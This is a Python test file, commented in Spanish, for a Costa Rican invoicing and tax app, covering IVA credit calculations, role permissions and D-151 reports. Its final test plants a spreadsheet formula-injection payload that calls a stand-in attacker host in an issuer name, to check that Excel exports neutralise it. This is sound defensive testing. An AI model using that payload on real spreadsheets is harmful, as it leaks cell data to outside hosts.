"""Panel tributario y reportes en colones. D13: el credito de IVA sale de las recepciones respondidas (no de los gastos);
los gastos ligados no cuentan dos veces; los manuales van aparte; lo rechazado al proveedor no entra al "a pagar".
D-270/D-151 sin lo respaldado por comprobante electronico. Nada de costos ni margenes."""

from datetime import date
from decimal import Decimal

from tests.hacienda_utils import clave, fe_xml, mensaje_hacienda, role_headers

HOY = date.today()
MES = HOY.strftime("%Y-%m")
FECHA = f"{HOY.isoformat()}T10:00:00-06:00"
A, B = HOY.replace(day=1).isoformat(), HOY.isoformat()


def cl(n):
    return clave(fecha=HOY.strftime("%d%m%y"), consecutivo=f"0010000101{n:010d}")


def recibir(client, n, **kw):
    kw.setdefault("fecha", FECHA)
    kw.setdefault("consecutivo", f"0010000101{n:010d}")
    r = client.post("/reception/upload", files={"file": ("f.xml", fe_xml(cl(n), **kw).encode(), "application/xml")})
    assert r.status_code == 201, r.text
    return r.json()


def responder(client, rid, **body):
    body.setdefault("action", "aceptada")
    r = client.post(f"/reception/{rid}/respond", json=body)
    assert r.status_code == 200, r.text
    return r.json()


def iva(client):
    return client.get("/accounting/tax-summary", params={"month": MES}).json()["iva"]


def _tc(db_session, ExchangeRate):  # noqa: N803 - la semilla ya trae el de hoy: se fija en 500
    fx = db_session.query(ExchangeRate).filter(ExchangeRate.date == HOY, ExchangeRate.currency == "USD").first()
    if fx is None:
        db_session.add(ExchangeRate(date=HOY, currency="USD", sell=Decimal("500"), buy=Decimal("490")))
    else:
        fx.sell = Decimal("500")
    db_session.commit()


def D(x):  # noqa: N802
    return Decimal(str(x))


def test_credito_de_xml_sin_doble_conteo_manual_y_rechazos(client, auth, db_session):
    a = recibir(client, 1)  # 113000 con 13000 de IVA
    responder(client, a["id"], create_expense=False)  # aceptada SIN gasto: igual da credito (D13)
    b = recibir(client, 2)
    responder(client, b["id"])  # con gasto ligado: no cuenta dos veces
    x = iva(client)
    assert D(x["credito_xml_crc"]) == Decimal("26000.00") and D(x["credito_manual_crc"]) == 0
    assert D(x["credito_por_confirmar_crc"]) == Decimal("26000.00")  # sin respuesta de Hacienda al proveedor
    # un gasto manual con credito sale en su propia linea y entra al "a pagar"
    client.post("/expenses", json={"description": "Papelería", "date": HOY.isoformat(), "subtotal": 10000, "tax_rate": 13})
    x = iva(client)
    assert D(x["credito_manual_crc"]) == Decimal("1300.00") and D(x["credito_crc"]) == Decimal("27300.00")
    assert D(x["a_pagar_crc"]) == D(x["debito_crc"]) - Decimal("27300.00")
    # el proveedor manda la respuesta de Hacienda: rechazado -> sale del credito y no entra al "a pagar"
    client.post("/reception/upload", files={"file": ("r.xml", mensaje_hacienda(cl(1), mensaje="3", detalle="Rechazado").encode(), "application/xml")})
    client.post("/reception/upload", files={"file": ("r.xml", mensaje_hacienda(cl(2)).encode(), "application/xml")})
    x = iva(client)
    assert D(x["credito_sin_respaldo_crc"]) == Decimal("13000.00") and D(x["credito_xml_crc"]) == Decimal("13000.00")
    assert D(x["credito_por_confirmar_crc"]) == 0
    rep = client.get("/reports/iva", params={"from": A, "to": B}).json()
    assert D(rep["totals"]["a_pagar"]) == D(x["a_pagar_crc"])


def test_usd_prorrata_vencen_pronto_y_sin_costos(client, auth, db_session):
    from app.models import ExchangeRate

    _tc(db_session, ExchangeRate)
    client.post("/expenses", json={"description": "Licencia", "date": HOY.isoformat(), "currency": "USD", "subtotal": 100, "tax_rate": 13})
    x = iva(client)
    assert D(x["credito_manual_crc"]) == Decimal("6500.00")  # 13 USD x 500
    client.post("/expenses", json={"description": "Mixto", "date": HOY.isoformat(), "subtotal": 10000, "tax_rate": 13, "iva_credit": "proporcional"})
    assert D(iva(client)["proporcional_crc"]) == Decimal("1300.00")
    assert client.put("/accounting/settings", json={"iva_prorrata_pct": 50}).status_code == 200
    x = iva(client)
    assert D(x["credito_prorrata_crc"]) == Decimal("650.00") and D(x["prorrata_pct"]) == 50
    recibir(client, 3)
    s = client.get("/accounting/tax-summary", params={"month": MES}).json()
    assert s["recepciones"]["por_revisar"] == 1 and s["hacienda"]["mode"] in ("ninguno", "simulado")
    txt = str(s).lower()
    assert "costo" not in txt and "margin" not in txt and "cost" not in txt
    conta = role_headers(client, db_session, auth["tenant"]["id"], "conta.trib@ejemplo.com", "contabilidad")
    assert client.get("/accounting/tax-summary", headers=conta).status_code == 200
    assert client.get("/reports/rentabilidad", headers=conta).status_code == 403  # sigue siendo del admin
    ventas = role_headers(client, db_session, auth["tenant"]["id"], "ventas.trib@ejemplo.com", "ventas")
    assert client.get("/accounting/tax-summary", headers=ventas).status_code == 403


def test_resultados_con_iva_no_acreditable_como_gasto(client, auth):
    a = recibir(client, 4)
    responder(client, a["id"], iva_condition="no_credito")
    rep = client.get("/reports/resultados", params={"from": A, "to": B}).json()
    gastos = next(r[1] for r in rep["rows"] if r[0] == "Gastos")
    assert D(gastos) == Decimal("113000.00")  # con 04 el IVA ES gasto


def test_d270_excluye_xml_y_usa_tipo_d151(client, auth, db_session):
    from app.models import ExchangeRate

    _tc(db_session, ExchangeRate)
    a = recibir(client, 5)
    responder(client, a["id"])  # compra con XML: no se informa
    sup = client.post("/suppliers", json={"name": "Arrendadora Ficticia", "tax_id": "3-101-555555"}).json()
    cat = client.post("/expense-categories", json={"name": "Local", "d151_kind": "alquiler"}).json()
    client.post("/expenses", json={"description": "Alquiler octubre", "date": HOY.isoformat(), "subtotal": 100000, "tax_rate": 0, "supplier_id": sup["id"], "category_id": cat["id"]})
    sup2 = client.post("/suppliers", json={"name": "Proveedor Exterior", "tax_id": "9999999999"}).json()
    client.post("/expenses", json={"description": "Servicio", "date": HOY.isoformat(), "currency": "USD", "subtotal": 10, "tax_rate": 0, "supplier_id": sup2["id"]})
    rep = client.get("/reports/d151", params={"from": A, "to": B}).json()
    assert rep["title"].startswith("D-270 / D-151")
    ids = {r[1] for r in rep["rows"]}
    assert "3101000001" not in ids and "3-101-000001" not in ids  # lo del XML no esta
    alq = next(r for r in rep["rows"] if r[1] == "3-101-555555")
    assert alq[0] == "Gastos específicos" and alq[3] == "alquiler"
    ext = next(r for r in rep["rows"] if r[1] == "9999999999")
    assert D(ext[4]) == Decimal("5000.00")  # en colones con su TC
    assert "Supera umbral D-151" in rep["columns"]
    compras = client.get("/reports/compras", params={"from": A, "to": B}).json()
    assert "Respaldo" in compras["columns"]
    resp = {r[-1] for r in compras["rows"]}
    assert "XML sin respuesta de Hacienda" in resp and "Sin XML" in resp
    assert client.get("/reports/compras", params={"from": A, "to": B, "format": "xlsx"}).status_code == 200
    assert client.get("/reports/d151", params={"from": A, "to": B, "format": "xlsx"}).status_code == 200


def test_excel_no_ejecuta_formulas_que_vienen_del_xml(client, auth):
    """El nombre del emisor sale de un XML que llego por correo sin autenticar: en el Excel va como texto, nunca formula."""
    from io import BytesIO

    from openpyxl import load_workbook

    malicioso = '=HYPERLINK("https://atacante.example/?"&C5,"Ver")'
    d = recibir(client, 95, nombre=malicioso.replace("&", "&amp;"))
    assert d["issuer_name"] == malicioso
    responder(client, d["id"], create_expense=True)
    for rep in ("compras", "recepciones", "gastos"):
        x = client.get(f"/reports/{rep}", params={"from": A, "to": B, "format": "xlsx"})
        assert x.status_code == 200, (rep, x.text)
        ws = load_workbook(BytesIO(x.content)).active
        celdas = [c for row in ws.iter_rows(min_row=5) for c in row if isinstance(c.value, str) and c.value.startswith("=")]
        assert celdas and all(c.data_type == "s" and c.quotePrefix for c in celdas), rep
